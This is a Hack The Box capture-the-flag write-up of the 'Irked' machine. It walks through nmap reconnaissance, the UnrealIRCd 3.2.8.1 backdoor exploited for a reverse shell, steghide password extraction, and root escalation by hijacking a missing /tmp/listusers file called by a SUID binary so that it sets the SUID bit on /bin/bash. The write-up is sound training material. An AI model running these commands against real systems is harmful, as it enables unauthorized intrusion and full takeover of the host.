---
layout: post
title:  "Irked Writeup - Hack The Box"
date:   2025-07-19
desc: ""
keywords: "HTB,eJPT,Linux,UnreallRCd Exploitation,Steganography,SUID Binary Abuse,Ghidra,Easy"
categories: [HTB]
tags: [HTB,eJPT,Linux,UnreallRCd Exploitation,Steganography,SUID Binary Abuse,Ghidra,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/irked_writeup/Irked.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

After a series of very complex machines to make, I think it's time to relax slowly and face a machine that does not lead me to overload my **Cognitive load**, and the **Irked** machine, classified as **Easy** by the community, was excellent to make, as it presented a variety of concepts. Perhaps for many professionals in the **Information Security** area it is not difficult to engage this type of machine, but for me it is always a challenge to find the attack vector among so many available options. Now I just need to log into my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account and spawn the box to start the lab.

<br /><br />
<img src="{{ site.img_path }}/irked_writeup/Irked_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I already have more clear the methodology that I must follow in each laboratory that I perform on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, so with each machine that I face I try to **improve** or **correct my shortcomings**. With `ping` I check that I already have access to the box and with the tool developed by the **[hack4u](https://hack4u.io/){:target="_blank"}** community, `whichSystem.py`, I can know for sure the **OS** installed on the victim machine. The **Reconnaissance** phase is crucial to optimize the time I will have to spend on the **Engagement** of the machine, so I try not to overlook anything and write down every detail that can be useful later, with `nmap` I get the list of open ports on the machine. With `nmap` scripts I also leak all possible information about the services and their versions, which I will have to try to exploit some vulnerability or misconfiguration. With all the information I also get the **Codename** of the **OS**, plus I already have a small overview of some interesting protocols such as **RPC** and even a domain that I will add to my **hosts** file immediately. The web service is the one with the largest attack surface so I'm going to disclose the technology stack behind the application with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, but I can't find anything interesting at the moment.

```bash
ping -c 1 10.10.10.117
whichSystem.py 10.10.10.117
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.117 -oG allPorts
nmap -sCV -p22,80,111,6697,8067,49224,65534 10.10.10.117 -oN targeted
cat targeted
#   --> OpenSSH 6.7p1 Debian 5+deb8u4
#   google.es --> OpenSSH 6.7p1 5+deb8u4 launchpad      Jessie  
#   --> Apache httpd 2.4.10
#   google.es --> Apache httpd 2.4.10 launchpad         Jessie
#   irked.htb

whatweb http://10.10.10.117
nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 irked.htb
whatweb http://irked.htb

# http://irked.htb/
```

<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/irked_writeup/Irked_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My instinct tells me to investigate the **[Portmapper](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.html?highlight=port%20111#basic-information){:target="_blank"}** protocol available on port **111** with `rpcinfo` and even with `nmap` to leak sensitive information, but I can't find anything relevant. There are some very interesting open ports related to the **IRC** protocol that catch my attention, and I find with `searchsploit` in the local **ExploitDB** database some vulnerabilities and their corresponding exploits for this protocol. Although I don't have the exact version of **[UnrealIRCd](https://www.unrealircd.org/){:target="_blank"}** I'm going to download an exploit written in **Python** from **[Ranger11Danger](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor){:target="_blank"}** to analyze it and try to exploit the **backdoor**. Just by making a little adjustments to the script and understanding what information I need to pass as parameters to get a **Reverse Shell**, now I can run the exploit and capture the incoming reverse shell with `nc` on port **443** to access the system.

> **[Portmapper](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.html?highlight=port%20111#basic-information){:target="_blank"}** is a service that is utilized for mapping network service ports to **RPC** (**Remote Procedure Call**) program numbers. It acts as a critical component in Unix-based systems, facilitating the exchange of information between these systems. The port associated with **Portmapper** is frequently scanned by attackers as it can reveal valuable information. This information includes the type of **Unix Operating System** (**OS**) running and details about the services that are available on the system. Additionally, **Portmapper** is commonly used in conjunction with **NFS** (**Network File System**), **NIS** (**Network Information Service**), and other RPC-based services to manage network services effectively.

> **[UnrealIRCd](https://www.unrealircd.org/){:target="_blank"}** is a highly advanced **IRCd** with a strong focus on modularity and security. It uses an advanced and highly configurable configuration file. Other key features include: full **IRCv3** support, **SSL/TLS**, **cloaking**, **advanced anti-flood** and **anti-spam** systems, **GeoIP**, remote includes, and lots of other features.

> **UnrealIRCd 3.2.8.1**, as distributed on certain mirror sites from November 2009 through June 2010, contains an externally introduced modification (**[Trojan Horse](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2010-2075){:target="_blank"}**) in the **DEBUG3_DOLOG_SYSTEM** macro, which allows remote attackers to execute arbitrary commands.

```bash
rpcinfo irked.htb
nmap -sSUC -p111 10.10.10.117

cat targeted | grep UnrealIRCd

searchsploit UnrealIRCd

wget https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/refs/heads/master/exploit.py
mv exploit.py UnrealIRCd_exploit.py
python3 UnrealIRCd_exploit.py -h

nvim UnrealIRCd_exploit.py
cat UnrealIRCd_exploit.py | grep -E 'local_ip =|local_port ='
# :) All OK!

nc -nlvp 443
python3 UnrealIRCd_exploit.py -payload bash 10.10.10.117 6697

whoami
hostname
hostname -I
```

<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In order to have a better mobility I'm going to make a **Console treatment**, so that the proportions are correct and I can use some shortcuts. Although I'm already in the system I still can not see the content of the first flag, maybe it is a sign that I must perform a **User pivoting**. With the first basic commands of enumeration of the system I check that the codename was indeed **Jessie**, I do not find **cron jobs** and I cannot know if I have special permissions, but I find a hidden file (**.backup**) that stores a password, that perhaps serves for some challenge of **Steganography** since it does not correspond to the user of the system, **djmardov**.

```bash
script /dev/null -c bash
# [Ctrl^Z]
stty raw -echo; fg
reset xterm
uname -a
lsb_release -a
id
groups
sudo -l
crontab -l
file .backup
cat .backup

su djmardo3v
# :(
```

<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I can't find much more in the system, I focus on the image available on the web page, many techniques related to steganography use images and their characteristics to store **Sensitive** or **secret information**. With `steghide` I check that there is hidden content in it, and with the password I found I can get the password that allows me to pivot to the user **djmardov**. I start a new phase of enumeration and find a number of binaries with **SUID** permissions worth investigating. The `pkexec` tool is one of them and I can probably use **[PwnKit](https://github.com/ly4k/PwnKit){:target="_blank"}** to **Escalate privileges**, but that's not the intended path, so I go to investigate `viewuser`, which turns out to be a **32bit** executable and is owned by the **root** user. When I try to run it, it generates an error because it does not find a file necessary for its execution, I already **find the vector** to Escalate privileges. 

> **Attacker Machine**:

```bash
wget http://irked.htb/irked.jpg
file irked.jpg
exiftool irked.jpg
strings irked.jpg                   # ?
steghide info irked.jpg
steghide extract -sf irked.jpg
```

> **Victime Machine**:

```bash
su djmardov
# :)
sudo -l
id
groups

find \-perm -4000 2>/dev/null
# ./usr/bin/pkexec        Not intended path
# ./usr/bin/X
# ./usr/bin/viewuser

ls -l ./usr/bin/X
./usr/bin/X
ls -l ./usr/bin/viewuser
./usr/bin/viewuser
# sh: 1: /tmp/listusers: not found            File hijacking ?
```

<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The file does not exist in the path it should be, so my next step is to create a file but with a malicious command that enables the **Bit SUID** in the **Bash** shell. After giving my malicious file execution permissions, I run the `viewuser` binary and check that the **Bash** shell permissions have been changed, so I can migrate to one, without needing to enter the **root** password. I can now access the last flag, pwned machine.

```bash
cd /tmp
ls -la
# listusers not exist :)

touch /tmp/listusers
nano /tmp/listusers
cat !$
```

> **listusers**:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

```bash
ls -l /bin/bash
# -rwxr-xr-x 1 root root 1105840 Nov  5  2016 /bin/bash

/usr/bin/viewuser
chmod +x listusers
/usr/bin/viewuser
ls -l /bin/bash
# -rwsr-xr-x 1 root root 1105840 Nov  5  2016 /bin/bash
bash -p
# :)
```

<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/irked_writeup/Irked_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Although the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines are classified as **Easy**, I always end up getting caught in one way or another by the concepts that I have to assimilate in trying to **Engage** each laboratory. This box made me reflect that you should never underestimate its complexity or take for granted that the techniques to be applied may look simple, as I did not remember some of them. Now I just have to kill the box and start my next lab.

<br /><br />
<img src="{{ site.img_path }}/irked_writeup/Irked_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
